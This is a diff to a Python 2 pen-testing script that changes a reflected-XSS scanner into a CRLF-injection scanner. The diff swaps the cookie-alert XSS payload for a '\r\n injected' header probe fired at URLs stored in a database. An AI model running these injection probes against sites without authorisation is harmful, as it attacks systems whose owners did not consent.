@@ -103,29 +103,37 @@ def make_parameters(url):
     return result
 
 
-def save_data(method, case, url, payloads):
+def save_data(method, case, url, payloads, headers):
     
-    if method == "POST":
-        f = open("r_xss_result.csv", "a+")
+    for header in headers.keys():
+        # crlf in header value
+        if header.find("injected") != -1:
+            f = open("crlf_injection_result.csv", "a+")
+            
+            if payloads:
+                f.write(urlparse(url)[1] + "," + method + "," + case + ","  + payloads + "\n")
+                f.close()
+                print url
+                
+            else:
+                f.write(urlparse(url)[1] + "," + method + "," + case + "," + url + "\n")
+                f.close()
+                print url
+                
+    for header in headers.keys():
+        # crlf in header value
+        if headers[header].find("injected") != -1:
+            f = open("crlf_injection_result.csv", "a+")
+            if payloads:
+                f.write(urlparse(url)[1] + "," + method + "," + case + ","  + payloads + "\n")
+                f.close()
+
+            else:
+                f.write(urlparse(url)[1] + "," + method + "," + case + "," + url + "\n")
+                f.close()
+                print url
+
         
-        try:
-            payloads = dictToQuery(payloads)
-            f.write(urlparse(url)[1] + "," + method + "," + case + ","  + payloads + "\n")
-            f.close()
-            print url
-
-        except: 
-            f.write(urlparse(url)[1] + "," + method + "," + case + ","  + str(payloads) + "\n")
-            f.close()
-            print url
-
-    else:
-        f = open("r_xss_result.csv", "a+")
-        f.write(urlparse(url)[1] + "," + method + "," + case + "," + url + "\n")
-        f.close()
-        print url
-    
-    
         
 def web_request(payloads, method, action, case, attack_commands):
     
@@ -146,12 +154,12 @@ def web_request(payloads, method, action, case, attack_commands):
                                        verify = False,\
                                        params = payloads)
                     res_contents = res.content
-                    
+
                     for attack_command in attack_commands:
             
                         if res_contents.find(attack_command) != -1:
                             
-                            save_data(method, case, str(res.url), None)
+                            save_data(method, case, str(res.url), None, res.headers)
 
                 except:
                     pass
@@ -169,7 +177,7 @@ def web_request(payloads, method, action, case, attack_commands):
             
                         if res_contents.find(attack_command) != -1:
                             
-                            save_data(method, case, str(res.url), None)
+                            save_data(method, case, str(res.url), None, res.headers)
    
                 except:
                     pass                          
@@ -178,7 +186,7 @@ def web_request(payloads, method, action, case, attack_commands):
             print action
             print e
         
-    elif method == "GET" and case == "case2":
+    elif method == "GET" and case == "case21":
 
         try:
             
@@ -197,7 +205,7 @@ def web_request(payloads, method, action, case, attack_commands):
             
                         if res_contents.find(attack_command) != -1:
 
-                            save_data(method, case, str(res.url), None)
+                            save_data(method, case, str(res.url), None, res.headers)
                  
                 except:
                     pass
@@ -218,7 +226,7 @@ def web_request(payloads, method, action, case, attack_commands):
             
                         if res_contents.find(attack_command) != -1:
                             
-                            save_data(method, case, str(res.url), None)
+                            save_data(method, case, str(res.url), None, res.headers)
                  
                 except:
                     pass
@@ -227,7 +235,7 @@ def web_request(payloads, method, action, case, attack_commands):
             print action
             print e
     
-    elif method == "POST" and case == "case2":
+    elif method == "POST" and case == "case21":
                 
         try:
 
@@ -245,7 +253,7 @@ def web_request(payloads, method, action, case, attack_commands):
             
                         if res_contents.find(attack_command) != -1:
                             
-                            save_data(method, case, str(res.url), payloads)
+                            save_data(method, case, str(res.url), payloads, res.headers)
                     
                 except:
                     pass
@@ -265,7 +273,7 @@ def web_request(payloads, method, action, case, attack_commands):
             
                         if res_contents.find(attack_command) != -1:
                             
-                            save_data(method, case, str(res.url), payloads)
+                            save_data(method, case, str(res.url), payloads, res.headers)
                     
                 except:
                     pass
@@ -275,7 +283,7 @@ def web_request(payloads, method, action, case, attack_commands):
             print e
              
 
-def predict_xss_attack_time(attack_commands):
+def predict_crlf_attack_time(attack_commands):
 
     attack_command_len = len(attack_commands)
     cur.execute("select url from " + table_name)
@@ -318,13 +326,13 @@ def xss_attack(payloads, method, action, case, attack_commands):
     
 def main():
     
-    usage        = '''./reflected_xss.py -t google'''
+    usage        = '''./crlf injection.py -t google'''
     
-    parser = argparse.ArgumentParser(description = "reflected xss for pen testing", \
+    parser = argparse.ArgumentParser(description = "crlf injection for pen testing", \
                                      usage = usage)
     parser.add_argument("-t", "--table", required=True, help="sqlite table name to attack")
     parser.add_argument("-c", "--cookie", required=False, help="filename containing cookie")
-    parser.add_argument("-v", "--version", action='version', version = 'JongWon Kim (dikien2012@gmail.com)\n%(prog)s - v.1.0 (04/22/2014)')
+    parser.add_argument("-v", "--version", action='version', version = 'JongWon Kim (dikien2012@gmail.com)\n%(prog)s - v.1.0 (04/24/2014)')
 
     args = parser.parse_args()
 
@@ -342,7 +350,7 @@ def main():
         cookie = None
 
     try:
-        os.remove("r_xss_result.csv")
+        os.remove("crlf_injection_result.csv")
     except:
         pass
     
@@ -360,12 +368,11 @@ def main():
     global cur
     cur = conn.cursor()
         
-    attack_commands = ["\" onmouseover=alert(document.cookie)>"]
-#     attack_commands = ["onmouseovertest"]
+    attack_commands = ["\r\n injected"]
 
     links_to_visit_params = []
     
-    predict_xss_attack_time(attack_commands)
+    predict_crlf_attack_time(attack_commands)
 
     
 #step1
@@ -399,7 +406,7 @@ def main():
 
     print "*" * 120
     print "you send requests %s times" % f_req_cnt
-    print '\nreflected xss attack\'s stage 1 is done: ', end_time - start_time
+    print '\ncrlf injection attack\'s stage 1 is done: ', end_time - start_time
     print "*" * 120
 
     
@@ -456,7 +463,7 @@ def main():
 
     print "*" * 120
     print "you send requests %s times" % (req_cnt - f_req_cnt)
-    print '\nreflected xss attack\'s stage 2 is done: ', end_time - start_time
+    print '\ncrlf injection attack\'s stage 2 is done: ', end_time - start_time
     print "*" * 120
 
     
